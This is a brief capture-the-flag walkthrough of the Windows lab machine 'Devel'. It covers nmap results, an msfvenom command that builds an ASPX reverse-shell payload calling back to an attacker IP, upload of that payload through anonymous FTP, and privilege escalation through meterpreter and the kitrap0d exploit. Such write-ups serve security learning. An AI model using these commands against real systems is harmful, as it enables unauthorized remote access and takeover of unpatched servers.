# Devel - Windows

Difficulty: 2

Enumeration

### Nmap scan results

```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|*03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|*  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Initial access

creating a reverse shell payload using msfvenom 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.8 LPORT=1234 -f aspx -o reverse.aspx
```

uploading it to ftp server

```bash
ftp>put reverse.aspx
```

accessing the file via browser to gain a windows shell

![Untitled](Untitled.png)

Target enumeration

`systeminfo` reveals that no Hotfixes are installed

![Untitled](Untitled%201.png)

**No patches are installed**

Privilege Escalation

manual exploitation didn't work - couldn't compile the exploit `40564.c` - segmentation fault

generating a meterpreter payload, uploading it and gaining a meterpreter shell 

![Untitled](Untitled%202.png)

send it to background and enumerate the target for potential vulnerabilities using a suggester

![Untitled](Untitled%203.png)

using kitrap@d exploit for gaining a system shell